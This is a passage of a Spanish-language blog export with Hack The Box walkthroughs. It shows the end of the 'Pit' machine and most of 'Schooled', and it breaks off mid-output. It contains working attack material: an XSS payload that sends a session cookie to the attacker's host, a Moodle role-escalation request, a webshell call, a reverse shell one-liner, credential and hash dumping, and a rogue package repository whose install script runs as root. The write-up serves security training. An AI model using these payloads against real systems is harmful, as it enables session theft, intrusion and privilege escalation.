Tomamos en cuenta que el unico usuario que ejeucta este script es root, agregamos un archivo a la carpeta /usr/local/monitoring/ con el nombre check.sh el cual contiene un comando para agregar la clave de SSH de michelle al archivo authorized_keys del usuario root.\n1 2 3 4 5 # echo \u0026#34;echo \u0026#39;ssh-rsa AAAAB3[...]8cTIs= michelle@pit.htb\u0026#39; \u0026gt; /root/.ssh/authorized_keys\u0026#34; \u0026gt; /usr/local/monitoring/check.sh [michelle@pit ~]$ \u0026lt;CdJKfC/TvFbs/q+Nuq41ULJNERZ19qIyxCshQtisKwFY2If8= kali@kali\u0026#39; \u0026gt; /root/.ssh/authorized_keys\u0026#34; \u0026gt; /usr/local/monitoring/check.sh [michelle@pit ~]$ cat /usr/local/monitoring/check.sh echo \u0026#39;ssh-rsa AAAAB3[...]8cTIs= michelle@pit.htb\u0026#39; \u0026gt; /root/.ssh/authorized_keys [michelle@pit ~]$ Para que el comando se ejecute realizamos la ejecucion de snmpwalk (1)\n1 π ~/htb/pit ❯ snmpwalk -v 2c -c public pit.htb NET-SNMP-EXTEND-MIB::nsExtendObjects|tail -n 1 Luego de la ejecucion de snmpwalk utilizamos ssh para cambiar al usuario root, con lo cual obtenemos la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 [michelle@pit ~]$ ssh root@localhost The authenticity of host \u0026#39;localhost (::1)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:N07IT3fGYgOB1uKAL/kctwXiIXEDS6kmuNno6+6uQts. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;localhost\u0026#39; (ECDSA) to the list of known hosts. Web console: https://pit.htb:9090/ Last login: Mon May 10 11:42:46 2021 [root@pit ~]# whoami root [root@pit ~]# ll total 8 -rwx------. 1 root root 706 Apr 22 2020 cleanup.sh drwx------. 2 root root 122 Apr 18 2020 monitoring lrwxrwxrwx. 1 root root 9 May 10 11:07 null -\u0026gt; /dev/null -r--------. 1 root root 33 May 25 14:46 root.txt [root@pit ~]# cat root.txt 2df6f7423ddcef30093a07cdee9fdcc1 [root@pit ~]# ","description":"Pit corre snmp donde encontramos informacion que nos permitio explotar una vulnerabilidad en SeedDMS para lograr obtener acceso por Cockpit con contraseñas almacenadas. Finalmente escalamos privilegios utilizando un script que encontramos en snmp.","id":49,"section":"posts","tags":["cockpit","snmp","SeedDMS","centOS"],"title":"Hack The Box - Pit","uri":"https://sckull.github.io/posts/pit/"},{"content":"\rSchooled presenta una version de Moodle con una vulnerabilidad que permite escalar privilegios y además obtener acceso a la maquina tras la instalacion de un plugin. Creamos un repositorio utilizando PKG y un paquete para ejecutar comandos lo que nos dio acceso privilegiado.\nNombre Schooled OS FreeBSD Puntos 30 Dificultad Media IP 10.10.10.234 Maker TheCyberGeek\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.5, 6.8, 6, 4, 3.2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[8, 8, 8, 2, 2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Enum Nmap Escaneo de puertos con nmap nos muestra el puerto http (80), ssh (22) y el puerto mysql (33060) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 # Nmap 7.91 scan initiated Wed Apr 7 02:04:59 2021 as: nmap -p- --min-rate 10000 -oN allports 10.129.95.59 Warning: 10.129.95.59 giving up on port because retransmission cap hit (10). Nmap scan report for 10.129.95.59 (10.129.95.59) Host is up (0.093s latency). Not shown: 48317 filtered ports, 17215 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 33060/tcp open mysqlx # Nmap done at Wed Apr 7 02:06:44 2021 -- 1 IP address (1 host up) scanned in 104.58 seconds # Nmap 7.91 scan initiated Wed Apr 7 02:07:13 2021 as: nmap -p 22,80,33060 -sV -sC -oN serviceports 10.129.95.59 Nmap scan report for 10.129.95.59 (10.129.95.59) Host is up (0.084s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0) | ssh-hostkey: | 2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA) | 256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA) |_ 256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519) 80/tcp open http Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15 |_http-title: Schooled - A new kind of educational institute 33060/tcp open mysqlx? | fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message\u0026#34; | HY000 | LDAPBindReq: | *Parse error unserializing protobuf message\u0026#34; | HY000 | oracle-tns: | Invalid message-frame.\u0026#34; |_ HY000 Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Apr 7 02:07:33 2021 -- 1 IP address (1 host up) scanned in 20.34 seconds Web Encontramos una pagina estatica en el puerto 80, logramos ver el dominio schooled.htb en el footer de la pagina el cual agregamos a /etc/hosts.\nGobuster Utilizamos gobuster para busqueda de directorios y archivos, pero solo encontramos las direcciones que se muestran en la pagina.\n1 2 3 4 5 6 7 8 # gobuster dir -u http://schooled.htb/ -w directory-list-2.3-medium.txt -x php,html,txt,yaml,bak -q -t 50 /images (Status: 301) /contact.html (Status: 200) /about.html (Status: 200) /css (Status: 301) /js (Status: 301) /fonts (Status: 301) /teachers.html (Status: 200) Vemos en la pagina /teachers.html varios nombres y apellidos, lo cual podria servir para crear un diccionario de usuarios y/o contraseñas.\nTambien encontramos informacion importante, mencionan que proveen educacion online en la plataforma Moodle, pero, no encontramos ninguna direccion a moodle con gobuster.\nWfuzz - Subdominios Utilizamos wfuzz para verificar si existe algun subdominio, vemos que existe moodle.schooled.htb.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ┌──(kali㉿kali)-[~/htb/schooled] └─$ wfuzz -w /usr/share/wordlists/dirb/common.txt -H \u0026#34;Host: FUZZ.schooled.htb\u0026#34; --hh 20750 --hc 400 -t 100 10.129.95.59 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.129.95.59/ Total requests: 4614 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000002576: 200 1 L 5 W 84 Ch \u0026#34;moodle\u0026#34; Total time: 0 Processed Requests: 4614 Filtered Requests: 4613 Requests/sec.: 0 MOODLE Encontramos la plataforma moodle en moodel.schooled.htb.\nAl intentar registrarnos salto un error en el correo electronico y mostró un \u0026ldquo;nuevo\u0026rdquo; subdominio: student.schooled.htb, el cual enumeramos con gobuster pero no encontramos nada interesante. Utilizamos student.schooled.htb como dominio en nuestro correo electronico.\nTras el registro ingresamos a la plataforma y encontramos 4 cursos con el nombre de quienes los imparten, solo en el curso de Mathematics tenemos permiso de ingresar, tras ingresar al curso logramos obtener informacion del profesor Manuel Phillips, quien tiene el correo phillips_manuel@staff.schooled.htb y rol de Teacher. Además una larga lista de estudiantes quienes estan inscritos en este curso.\n1 2 3 4 Manuel Phillips, phillips_manuel@staff.schooled.htb, Teacher Jamie Borham Jane Higgins Lianne Carter Tambien encontramos dos anuncios, en el primero indica Jamie Borham la fecha de inicio de clases.\n1 2 3 Jamie Borham: We will commence studies on 7th January 2021. Please be aware that lectures will be delivered online on a week by week basis and content will be released on the day of study. En el segundo anuncio menciona que los estudiantes del curso de Phillips deben de tener configurado en su perfil la opcion de MoodleNet, y menciona que estará verificando esta configuracion en el perfil de los estudiantes.\n1 2 3 4 5 Manuel Phillips: This is a self enrollment course. For students who wish to attend my lectures be sure that you have your MoodleNet profile set. Students who do not set their MoodleNet profiles will be removed from the course before the course is due to start and I will be checking all students who are enrolled on this course. Look forward to seeing you all soon. CSRF Editamos el campo MoodleNet con etiquetas HTML y codigo javascript para mostrar una alerta, la cual se muestra al visitar nuestro perfil.\nEditamos nuevamente ahora con la etiqueta \u0026lt;script src=\u0026quot;http://10.10.14.10/a\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; apuntando hacia un archivo de nuestra maquina.\nCreamos un miniservidor, despues unos minutos logramos obtener una solicitud de dicho archivo, ya que, probablemente Phillips visitó nuestro perfil.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ┌──(kali㉿kali)-[~/htb/schooled] └─$ ifconfig tun0 |grep inet \u0026amp;\u0026amp; sudo python3 -m http.server 80 inet 10.10.14.10 netmask 255.255.254.0 destination 10.10.14.10 inet6 dead:beef:2::1008 prefixlen 64 scopeid 0x0\u0026lt;global\u0026gt; inet6 fe80::515:84c7:6091:42f6 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.14.10 - - [07/Apr/2021 05:09:15] code 404, message File not found 10.10.14.10 - - [07/Apr/2021 05:09:15] \u0026#34;GET /a HTTP/1.1\u0026#34; 404 - 10.10.14.10 - - [07/Apr/2021 05:09:15] code 404, message File not found 10.10.14.10 - - [07/Apr/2021 05:09:15] \u0026#34;GET /a HTTP/1.1\u0026#34; 404 - 10.10.14.10 - - [07/Apr/2021 05:09:18] code 404, message File not found 10.10.14.10 - - [07/Apr/2021 05:09:18] \u0026#34;GET /a HTTP/1.1\u0026#34; 404 - 10.129.95.59 - - [07/Apr/2021 05:11:39] code 404, message File not found \u0026lt;--- 10.129.95.59 - - [07/Apr/2021 05:11:39] \u0026#34;GET /a HTTP/1.1\u0026#34; 404 - \u0026lt;--- 10.129.95.59 - - [07/Apr/2021 05:11:40] code 404, message File not found \u0026lt;--- 10.129.95.59 - - [07/Apr/2021 05:11:40] \u0026#34;GET /a HTTP/1.1\u0026#34; 404 - \u0026lt;--- Sabemos que Phillips visita nuestro perfil cada cierto tiempo, por lo que podriamos realizar un ataque CSRF utilizando javascript. Editamos nuestro perfil nuevamente, esta vez con codigo que nos envie el valor de su cookie.\n1 \u0026lt;script\u0026gt;document.write(\u0026#39;\u0026lt;img src=\u0026#34;http://10.10.14.10/a?cookie=\u0026#39; + document.cookie + \u0026#39;\u0026#34; /\u0026gt;\u0026#39;)\u0026lt;/script\u0026gt; Luego de varios segundos obtuvimos una peticion con el valor de una cookie.\n1 2 3 4 10.10.14.10 - - [07/Apr/2021 05:27:16] code 404, message File not found 10.10.14.10 - - [07/Apr/2021 05:27:16] \u0026#34;GET /a?cookie=TinyMCE_toggle=id_description_editor%3D0;%20MoodleSession=d8p8jermnc90vr0vt6ce15v8ka HTTP/1.1\u0026#34; 404 - 10.129.95.59 - - [07/Apr/2021 05:28:13] code 404, message File not found 10.129.95.59 - - [07/Apr/2021 05:28:13] \u0026#34;GET /a?cookie=MoodleSession=cb7sn364b42d0qe1eercuuickd HTTP/1.1\u0026#34; 404 - \u0026lt;---- COOKIE Phillips Account Reemplazamos la cookie actual utilizando Firefox (F12), con lo cual logramos acceder a la cuenta de Phillips.\nMOODLE - RCE Al tener acceso a la cuenta de Phillips tenemos permisos de administrar el curso de Matematicas, al entrar observamos en el footer una direccion externa a la documentacion de Moodle en su version 3.9 por lo que ahora podriamos realizar una busqueda de vulnerabilidades con esta version.\nEncontramos un video demostrativo de como escalar privilegios desde el rol Teacher para poder ejecutar comandos mendiante la instalacion de un plugin.\n(CVE-2020-14321) Manager Verificamos el ID de nuestro usuario que registramos en la url visitando nuestro perfil.\n1 http://moodle.schooled.htb/moodle/user/profile.php?id=[ID] Dentro del curso de Matematicas agregamos un usuario cualquiera, podria ser alguno que tenga la extension staff.schooled.htb tomando en cuenta que uno de estos usuarios tiene el rol de Administrador, tambien capturamos la solicitud la cual se va a modificar utilizando burpsuite, en la solicitud modificamos las \u0026ldquo;variables\u0026rdquo;: userlist[]=24 y \u0026amp;roletoassign=5. La primera pertenece al usuario a agregar, en este caso vamos a agregar el nuestro el Id de Philips y la segunda pertenece al rol (manager) que se le va a asignar al usuario el cual modificamos a 1.\n1 2 3 4 GET /moodle/enrol/manual/ajax.php?mform_showmore_main=0\u0026amp;id=5\u0026amp;action=enrol\u0026amp;enrolid=10\u0026amp;sesskey=TFFRjCD1t7\u0026amp;_qf__enrol_manual_enrol_users_form=1\u0026amp;mform_showmore_id_main=0\u0026amp;userlist%5B%5D=24\u0026amp;roletoassign=1\u0026amp;startdate=4\u0026amp;duration= HTTP/1.1 Host: moodle.schooled.htb [... REDACTED ...] Tras modificar y enviar la solicitud deberiamos de ver en la lista de usuarios del curso nuestro rol como Manager.\nManager \u0026gt; Admin Al filtrar los usuarios por la extension del staff, vemos que Lianne Carter tiene el rol de Manager.\nVerificamos este ultimo usuario y nos logeamos con la opcion Log in as.\nLogramos obtener acceso yy vemos que este usuario tiene acceso al area de administracion.\nPlugin \u0026gt; RCE Modificamos la solicitud de Users \u0026gt; Permissions \u0026gt; Define Roles \u0026gt; Manager \u0026gt; Edit \u0026gt; Save Changes utilizando el payload para dar todos los permisos a este usuario y asi tener acceso a la seccion de plugins.\n1 2 3 4 5 6 POST /moodle/admin/roles/define.php?action=edit\u0026amp;roleid=1 HTTP/1.1 Host: moodle.schooled.htb [ ... REDACTED ... ] sesskey=jLH3lQNtzo [... PAYLOAD ... ] Ahora con todos los permisos logramos obtener acceso a la seccion de plugins donde instalamos el plugin para ejecucion de comandos.\nAhora nos dirigimos a la direccion /moodle/blocks/rce/lang/en/block_rce.php?cmd=id donde logramos ejecutar comandos en la maquina.\n1 2 3 4 5 6 ┌──(kali㉿kali)-[~/htb/schooled/tmp] └─$ curl -s \u0026#34;http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id;whoami;pwd;uname%20-a\u0026#34; uid=80(www) gid=80(www) groups=80(www) www /usr/local/www/apache24/data/moodle/blocks/rce/lang/en FreeBSD Schooled 13.0-BETA3 FreeBSD 13.0-BETA3 #0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021 root@releng1.nyi.freebsd.org:/usr/obj/usr/src/amd64.amd64/sys/GENERIC amd64 www - User Utilizamos una shell inversa para FreeBSD para obtener una shell con el usuario www.\n1 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |telnet 172.18.0.2 8080 \u0026gt; /tmp/f 1 2 3 4 5 6 7 ┌──(kali㉿kali)-[~/htb/schooled] └─$ nc -l -p 1338 id uid=80(www) gid=80(www) groups=80(www) whoami;pwd www /usr/local/www/apache24/data/moodle/blocks/rce/lang/en MySQL - Moodle DB Realizamos una enumeracion a los archivos de configuracion de moodle y encontramos las credenciales para la base de datos en mysql.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 pwd /usr/local/www/apache24/data/moodle/ cat config.php \u0026lt;?php // Moodle configuration file unset($CFG); global $CFG; $CFG = new stdClass(); $CFG-\u0026gt;dbtype = \u0026#39;mysqli\u0026#39;; $CFG-\u0026gt;dblibrary = \u0026#39;native\u0026#39;; $CFG-\u0026gt;dbhost = \u0026#39;localhost\u0026#39;; $CFG-\u0026gt;dbname = \u0026#39;moodle\u0026#39;; $CFG-\u0026gt;dbuser = \u0026#39;moodle\u0026#39;; $CFG-\u0026gt;dbpass = \u0026#39;PlaybookMaster2020\u0026#39;; $CFG-\u0026gt;prefix = \u0026#39;mdl_\u0026#39;; $CFG-\u0026gt;dboptions = array ( \u0026#39;dbpersist\u0026#39; =\u0026gt; 0, \u0026#39;dbport\u0026#39; =\u0026gt; 3306, \u0026#39;dbsocket\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;dbcollation\u0026#39; =\u0026gt; \u0026#39;utf8_unicode_ci\u0026#39;, ); $CFG-\u0026gt;wwwroot = \u0026#39;http://moodle.schooled.htb/moodle\u0026#39;; $CFG-\u0026gt;dataroot = \u0026#39;/usr/local/www/apache24/moodledata\u0026#39;; $CFG-\u0026gt;admin = \u0026#39;admin\u0026#39;; $CFG-\u0026gt;directorypermissions = 0777; require_once(__DIR__ . \u0026#39;/lib/setup.php\u0026#39;); // There is no php closing tag in this file, // it is intentional because it prevents trailing whitespace problems! which mysql find / -name mysql 2\u0026gt;/dev/null /usr/local/bin/mysql /usr/local/share/bash-completion/completions/mysql /usr/local/share/mysql /usr/local/include/mysql /usr/local/include/mysql/mysql /usr/local/etc/mysql /usr/local/lib/mysql /var/mail/mysql /var/db/mysql /var/db/mysql/mysql Enumeramos la base de datos de Moodle y encontramos las contraseñas encriptadas de los usuarios del staff.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 /usr/local/bin/mysql -u moodle -p\u0026#39;PlaybookMaster2020\u0026#39; -e \u0026#34;show databases;\u0026#34; Database information_schema moodle /usr/local/bin/mysql -u moodle -p\u0026#39;PlaybookMaster2020\u0026#39; -e \u0026#34;use moodle; show tables;\u0026#34; Tables_in_moodle mdl_analytics_indicator_calc mdl_analytics_models [ ... REDACTED ... ] mdl_url mdl_user mdl_user_devices mdl_user_enrolments mdl_user_info_category mdl_user_info_data mdl_user_info_field mdl_user_lastaccess mdl_user_password_history mdl_user_password_resets mdl_user_preferences mdl_user_private_key [ ... REDACTED ... ] /usr/local/bin/mysql -u moodle -p\u0026#39;PlaybookMaster2020\u0026#39; -e \u0026#34;use moodle; select id,username,password,email from mdl_user where email like \u0026#39;%staff.schooled.htb\u0026#39;;\u0026#34; id username password email 2 admin $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW jamie@staff.schooled.htb 23 higgins_jane $2y$10$n9SrsMwmiU.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2 higgins_jane@staff.schooled.htb 24 phillips_manuel $2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG phillips_manuel@staff.schooled.htb 25 carter_lianne $2y$10$jw.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe carter_lianne@staff.schooled.htb Jamie - User Verificamos los usuarios registrados en la maquina, y encontramos a jamie a quien le pusimos más prioridad para crackear el hash.\n1 2 3 cat /etc/passwd | grep home jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh steve:*:1002:1002:User \u0026amp;:/home/steve:/bin/csh Password Cracking Tras ejecutar John con el wordlist rockyou encontramos su contraseña.\n1 2 3 4 5 6 7 8 9 10 11 ┌──(kali㉿kali)-[~/htb/schooled] └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes_mysql_moodl Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status !QAZ2wsx (?) 1g 0:00:02:49 DONE (2021-04-08 04:19) 0.005903g/s 82.04p/s 82.04c/s 82.04C/s 110689..superpet Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed Utilizamos la contraseña encontrada con el usuario jamie en el servicio SSH para obtener una shell y nuestra flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ┌──(kali㉿kali)-[~/htb/schooled] └─$ ssh jamie@schooled.htb # !QAZ2wsx Password for jamie@Schooled: Last login: Tue Mar 16 14:44:53 2021 from 10.10.14.5 FreeBSD 13.0-BETA3 (GENERIC) #0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021 [ ... REDACTED ... ] # zfs allow -u receiver compression,mountpoint,mount,create,receive rxpool -- Benedict Reuschling \u0026lt;bcr@FreeBSD.org\u0026gt; jamie@Schooled:~ $ whoami;id;pwd jamie uid=1001(jamie) gid=1001(jamie) groups=1001(jamie),0(wheel) /home/jamie jamie@Schooled:~ $ cat user.txt | cut -c1-15 ecf7c6d61bfc9c8 jamie@Schooled:~ $ PrivEsc Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando pkg update y pkg install *. Verificamos la configuracion de pkg y vemos que el repositorio está en devops.htb, intentamos crear un archivo de configuracion alternativo pero no tenemos permisos suficientes. La direccion IP de devops.htb es local.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 amie@Schooled:~ $ sudo -l -l User jamie may run the following commands on Schooled: Sudoers entry: RunAsUsers: ALL Options: !authenticate Commands: /usr/sbin/pkg update Sudoers entry: RunAsUsers: ALL Options: !authenticate Commands: /usr/sbin/pkg install * jamie@Schooled:~ $ cat /etc/pkg/FreeBSD.conf # $FreeBSD$ # # To disable this repository, instead of modifying or removing this file, # create a /usr/local/etc/pkg/repos/FreeBSD.conf file: # # mkdir -p /usr/local/etc/pkg/repos # echo \u0026#34;FreeBSD: { enabled: no }\u0026#34; \u0026gt; /usr/local/etc/pkg/repos/FreeBSD.conf # FreeBSD: { url: \u0026#34;pkg+http://devops.htb:80/packages\u0026#34;, mirror_type: \u0026#34;srv\u0026#34;, signature_type: \u0026#34;none\u0026#34;, fingerprints: \u0026#34;/usr/share/keys/pkg\u0026#34;, enabled: yes } jamie@Schooled:~ $ mkdir -p /usr/local/etc/pkg/repos mkdir: /usr/local/etc/pkg: Permission denied jamie@Schooled:~ $ cat /etc/hosts|grep devops.htb 192.168.1.14 devops.htb jamie@Schooled:~ $ Despues de dar algunas vueltas verificamos los permisos del archivo /etc/hosts y observamos que el grupo wheel al que jamie pertenece tiene permisos sobre este archivo, por lo que podemos modificar la direccion IP del repositorio.\n1 2 3 jamie@Schooled:~ $ ls -ld /etc/hosts -rw-rw-r-- 1 root wheel 1098 Mar 17 15:47 /etc/hosts jamie@Schooled:~ $ PKG - Repo Bash Package Iniciamos ejecutando pkg create -a lo cual obtendra todos los paquetes instalados dentro de la maquina, obtenemos el archivo bash (podria ser otro) y cancelamos el proceso.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 jamie@Schooled:~ $ mkdir packages jamie@Schooled:~ $ cd packages/ jamie@Schooled:~/packages $ pkg create -a Loading the package list... Creating package for adwaita-icon-theme-3.38.0 [... REDACTED ...] Creating package for bash-5.1.4 Creating package for bash-completion-2.11,2 Creating package for ca_root_nss-3.58 Creating package for cairo-1.16.0_1,3 ^C jamie@Schooled:~/packages $ Una vez con el archivo target, extraemos el contenido de bash-5.1.4.txz y se crearan dos archivos y una carpeta, finalmente eliminamos o movemos el archivo bash-5.1.4.txz.\n1 2 3 4 5 6 7 8 jamie@Schooled:~/packages $ mv bash-5.1.4.txz ../ jamie@Schooled:~/packages $ rm * jamie@Schooled:~/packages $ mv ../bash-5.1.4.txz . jamie@Schooled:~/packages $ tar -xJf bash-5.1.4.txz tar: Removing leading \u0026#39;/\u0026#39; from member names jamie@Schooled:~/packages $ ls +COMPACT_MANIFEST +MANIFEST bash-5.1.4.txz usr jamie@Schooled:~/packages $ rm bash-5.1.4.txz Pre-script Dentro del archivo +MANIFEST es posible agregar comandos cuando un paquete es instalado utilizando el objeto scripts dentro de este, basados de la informacion de un ejemplo, agregamos pre-scripts al archivo con un comando de prueba obteniendo la flag root.txt.\n1 2 3 4 \u0026#34;scripts\u0026#34;: { \u0026#34;pre-install\u0026#34;: \u0026#34;cat /root/root.txt \u0026gt; /home/jamie/root.txt\u0026#34;, ... , ... } Además de ello modificamos la version al inicio de los archivos +MANIFEST y +COMPACT_MANIFEST a una más alta o reciente.\n- \u0026#34;version\u0026#34;:\u0026#34;5.1.4\u0026#34;\r+ \u0026#34;version\u0026#34;:\u0026#34;6.1.4\u0026#34; Luego de esto creamos un nuevo archivo con todos los archivos y carpetas con el nombre bash-6.1.4.txz.\n1 2 3 4 5 6 7 8 9 jamie@Schooled:~/packages $ tar cJf bash-6.1.4.txz * jamie@Schooled:~/packages $ ls +COMPACT_MANIFEST +MANIFEST bash-6.1.4.txz usr jamie@Schooled:~/packages $ mkdir tmp jamie@Schooled:~/packages $ mv bash-6.1.4.txz tmp jamie@Schooled:~/packages $ cd tmp/ jamie@Schooled:~/packages/tmp $ ls bash-6.1.4.txz jamie@Schooled:~/packages/tmp $ Repo Files Ejecutamos pkg repo . para crear todos los archivos necesarios para un repositorio con informacion de los paquetes dentro del directorio actual en este caso solo el paquete bash que contiene el comando ingresado.\n1 2 3 4 5 6 7 8 jamie@Schooled:~/packages/tmp $ ls bash-6.1.4.txz jamie@Schooled:~/packages/tmp $ pkg repo . Creating repository in .: 100% Packing files for repository: 100% jamie@Schooled:~/packages/tmp $ ls bash-6.1.4.txz meta.conf meta.txz packagesite.txz jamie@Schooled:~/packages/tmp $ Comprimimos la carpeta completa y la enviamos con netcat hacia nuestra maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 jamie@Schooled:~/packages/tmp $ cd .. jamie@Schooled:~/packages $ ls +COMPACT_MANIFEST +MANIFEST tmp usr jamie@Schooled:~/packages $ tar -zcvf a.tar.gz tmp/ a tmp a tmp/meta.txz a tmp/packagesite.txz a tmp/bash-6.1.4.txz a tmp/meta.conf jamie@Schooled:~/packages $ ls a.tar.gz a.tar.gz jamie@Schooled:~/packages $ Repo Server En nuestra maquina descomprimimos los archivos y creamos un mini servidor con python. Hay que mencionar que la carpeta con la informacion del repositorio debe llevar el nombre de packages.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ╭─kali@kali ~/htb/schooled/repo2 ╰─➤ ls a.tar.gz ╭─kali@kali ~/htb/schooled/repo2 ╰─➤ tar -xvf a.tar.gz tmp/ tmp/meta.txz tar: tmp/meta.txz: time stamp 2021-04-09 06:05:48 is 53.360748238 s in the future tmp/packagesite.txz tar: tmp/packagesite.txz: time stamp 2021-04-09 06:05:48 is 53.360611328 s in the future tmp/bash-6.1.4.txz tar: tmp/bash-6.1.4.txz: time stamp 2021-04-09 06:05:09 is 14.353302812 s in the future tmp/meta.conf tar: tmp/meta.conf: time stamp 2021-04-09 06:05:48 is 53.353078807 s in the future tar: tmp: time stamp 2021-04-09 06:05:48 is 53.353037336 s in the future ╭─kali@kali ~/htb/schooled/repo2 ╰─➤ ls a.tar.gz tmp ╭─kali@kali ~/htb/schooled/repo2 ╰─➤ mv tmp packages ╭─kali@kali ~/htb/schooled/repo2 ╰─➤ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Devops.htb En la maquina (schooled) editamos el archivo /etc/hosts agregando nuestra direccion IP al dominio devops.htb.\n1 2 3 jamie@Schooled:~/packages $ cat /etc/hosts|grep devops 10.10.14.145 devops.htb jamie@Schooled:~/packages $ Install pkg \u0026gt; root.txt Finalmente ejecutamos pkg update y pkg install bash, este ultimo comando ejecutará cat /root/root.txt \u0026gt; /home/jamie/root.txt por lo que podremos leer nuestra flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 jamie@Schooled:~/packages $ sudo pkg update Updating FreeBSD repository catalogue... Fetching meta.conf: 100% 163 B 0.2kB/s 00:01 Fetching packagesite.txz: 100% 932 B 0.9kB/s 00:01 Processing entries: 100% FreeBSD repository update completed. 1 packages processed. All repositories are up to date. jamie@Schooled:~/packages $ sudo pkg install bash Updating FreeBSD repository catalogue... FreeBSD repository is up to date. All repositories are up to date. The following 1 package(s) will be affected (of 0 checked): Installed packages to be UPGRADED: bash: 5.1.4 -\u0026gt; 7.1.4 Number of packages to be upgraded: 1 1 MiB to be downloaded. Proceed with this action? [y/N]: y [1/1] Fetching bash-6.1.4.txz: 100% 1 MiB 127.4kB/s 00:12 Checking integrity... done (0 conflicting) [1/1] Upgrading bash from 